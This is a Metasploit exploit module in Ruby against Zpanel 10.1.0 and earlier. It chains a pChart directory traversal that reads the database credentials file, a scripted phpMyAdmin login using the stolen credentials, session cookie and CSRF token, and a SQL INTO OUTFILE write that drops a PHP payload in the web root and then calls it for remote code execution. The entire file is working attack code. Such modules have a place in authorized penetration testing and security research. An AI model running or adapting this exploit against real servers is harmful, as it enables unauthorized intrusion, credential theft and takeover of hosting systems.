require 'msf/core'
require 'msf/core/exploit/php_exe'
require 'nokogiri'
require 'uri'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Zpanel Remote Unauthenticated RCE',
      'Description'    => %q{
        This module exploits an information disclosure vulnerability
        found in Zpanel <= 10.1.0. The vulnerability is due to a
        vulnerable version of pChart allowing remote, unauthenticated,
        users to read arbitrary files found on the filesystem. This
        particular module utilizes this vulnerability to identify the
        username/password combination of the MySQL instance. With the
        credentials the attackers can login to PHPMyAdmin and execute
        SQL commands to drop a malicious payload on the filesystem and
        call it leading to remote code execution.
      },
      'Author' =>
        [
          'dawn isabel',
          'brad wolfe',
          'brent morris',
          'james fitts'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-2097' ],
          [ 'EDB', '31173' ],    # pChart
          [ 'OSVDB', '102595' ], # pChart
          [ 'URL', 'http://bugs.zpanelcp.com/view.php?id=665' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2013/Jun/39' ],
          [ 'URL', 'http://www.reddit.com/r/netsec/comments/1ee0eg/zpanel_support_team_calls_forum_user_fucken/' ]
        ],
      'Payload' =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],
          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jan 30 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to Zpanel', '/zpanel'])
      ], self.class)
  end

  def get_setting(res, setting_name)
    n = ::Nokogiri::HTML(res.body)
    spans = n.search('//code//span//span')
    found_element = spans.select{ |e| /#{setting_name}/ === e.text }.first
    val = found_element.next.next.text
    val.scan(/['"]([[:print:]]+)['"]/).flatten.first || ''
  end

  def get_user(res)
    get_setting(res, 'user')
  end

  def get_passwd(res)
    get_setting(res, 'pass')
  end

  def get_dbname(res)
    get_setting(res, 'dbname')
  end

  def dot_dot_slash(uri)
    res = send_request_cgi({
      'method' =>'GET',
      'uri' => normalize_uri("#{uri}", 'etc', 'lib', 'pChart2', 'examples', 'index.php'),
      'vars_get' => {
        'Action' => 'View',
        'Script' => '../../../../cnf/db.php'
      }
    })

    uname  = get_user(res)
    passwd = get_passwd(res)
    dbname = get_dbname(res)

    return uname, passwd, dbname
  end

  def get_token_from_form(res)
    hidden_inputs = res.get_hidden_inputs
    hidden_inputs.first['token']
  end

  def get_token_from_url(url)
    u = URI(url)
    u.query.split('&').each do |param|
      param_name, param_value = param.scan(/([[:print:]]+)=([[:print:]]+)/).flatten
      return param_value if param_name == 'token'
    end

    ''
  end

  def grab_sess_and_token(uri)
    print_status('Attempting to get PHPSESSIONID')
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri("#{uri}"),
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while attempting to get PHPSESSID')
    end

    cookies = res.get_cookies
    sid = cookies.scan(/(PHPSESSID=\w+);*/).flatten[0] || ''

    if sid.length > 0
      print_good('PHPSESSID identified!')
      print_good("PHPSESSID = #{sid.split("=")[1]}")

      print_status('Attempting to get CSRF token')
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri("#{uri}", 'etc', 'apps', 'phpmyadmin', 'index.php'),
        'Cookie' => "#{sid}"
      })

      unless res
        fail_with(Failure::Unknown, 'Connection timed out while attempting to get CSRF token')
      end

      token = get_token_from_form(res)
      cookies = res.get_cookies

      cookies = cookies.split('; ')
      cookies = "#{cookies[-1]} #{cookies[1]}; #{cookies[2]}; #{cookies[3]}; #{sid}"

      if token.length > 0
        print_good('CSRF token identified!')
        print_good("CSRF token = #{token}")
        return cookies, token, sid
      else
        print_error('CSRF token could not be identified...')
      end
    else
      print_error('PHPSESSID could not be identified...')
    end
  end

  def login_phpmyadmin(uri, uname, passwd, cookies, token, sess_id)
    old_cookies = cookies

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri('etc', 'apps', 'phpmyadmin', 'index.php'),
      'cookie' => cookies,
      'ctype'  => 'application/x-www-form-urlencoded',
      'headers'=>
        {
          'Referer' => "http://#{datastore['RHOST']}/etc/apps/phpmyadmin/",
        },
      'vars_post' => {
        'pma_username'         => uname,
        'pma_password'         => passwd,
        'server'               => '1',
        'lang'                 => 'en',
        'collation_connection' => 'utf8_general_ci',
        'token'                => token
      }
    })

    cookies = "#{res.get_cookies}"

    old_cookies = old_cookies.split("; ")
    cookies = cookies.split("; ")

    new_cookies =  "#{old_cookies[0]}; "
    new_cookies << "#{old_cookies[1]}; "
    new_cookies << "#{old_cookies[2]}; "
    new_cookies << "#{old_cookies[3]}; "
    new_cookies << "#{cookies[0]}; "
    new_cookies << "#{cookies[1]} "
    new_cookies << "#{sess_id}"

    token = get_token_from_url(res['Location'])

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri('etc', 'apps', 'phpmyadmin', 'index.php'),
      'Referer'  => "http://#{datastore['RHOST']}/etc/apps/phpmyadmin/",
      'cookie'   => new_cookies,
      'vars_get' => {
        'token' => token
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while attempting to login to phpMyAdmin')
    end

    if res.code == 200 and res.body.to_s =~ /phpMyAdmin is more friendly with a/
      print_good('PHPMyAdmin login successful!')
      return new_cookies, token
    end
  end

  def do_sql(cookies, token, uri)
    fname = "#{rand_text_alpha_upper(5)}.php"
    sql_stmt = "SELECT \"<?php #{payload.encoded} ?>\" INTO OUTFILE \"/etc/zpanel/panel/#{fname}\""

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri('etc', 'apps', 'phpmyadmin', 'import.php'),
      'cookie' => cookies,
      'ctype'  =>'application/x-www-form-urlencoded; charset=UTF-8',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Referer' => "http://#{datastore['RHOST']}/etc/apps/phpmyadmin/server_sql.php?token=#{token}"
      },
      'vars_post' => {
        'is_js_confirmed' => '0',
        'token'           => token,
        'pos'             => '0',
        'goto'            => 'server_sql.php',
        'message_to_show' => 'Your+SQL+query+has+been+executed+successfully',
        'prev_sql_query'  => '',
        'sql_query'       => sql_stmt,
        'sql_delimiter'   => ';',
        'show_query'      => '1',
        'ajax_request'    => 'true',
        '_nocache'        => rand.to_s[2..19].to_i
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out when attempting to upload payload')
    end

    if res.body =~ /"success":true/
      print_good("'#{fname}' successfully uploaded")
      print_good("A privilege escalation exploit can be found 'exploits/linux/local/zpanel_zsudo'")
      print_status("Executing '#{fname}' on the remote host")

      res = send_request_cgi({
        'method'=>'GET',
        'uri'=>normalize_uri("#{uri}", "#{fname}")
      })
    else
      print_error("#{res.body.to_s}")
    end
  end

  def exploit
    # Checking pChart
    res = send_request_cgi({
      'method'=> 'GET',
      'uri'=> normalize_uri("#{datastore['URI']}", 'etc', 'lib', 'pChart2', 'examples', 'index.php')
    })

    # if pChart is vuln version
    if res.body =~ /pChart 2\.x/
      uname, passwd, db_name = dot_dot_slash("#{datastore['URI']}")
      if uname.length > 0 && passwd.length > 0
        print_good('Directory traversal successful, Username/Password identified!')
        print_good("Username: #{uname}")
        print_good("Password: #{passwd}")
        print_good("DB Name: #{db_name}")
        cookies, token, sess_id = grab_sess_and_token("#{datastore['URI']}")
        print_status('Logging into PHPMyAdmin now')
        cookies, token = login_phpmyadmin("#{datastore['URI']}", uname, passwd, cookies, token, sess_id)
        print_status('Uploading malicious payload now')
        do_sql(cookies, token, "#{datastore['URI']}")
      else
        print_error('It appears that the directory traversal was unsuccessful...')
      end
    else
      print_error("It appears that the version of pChart is not vulnerable...")
    end
  end
end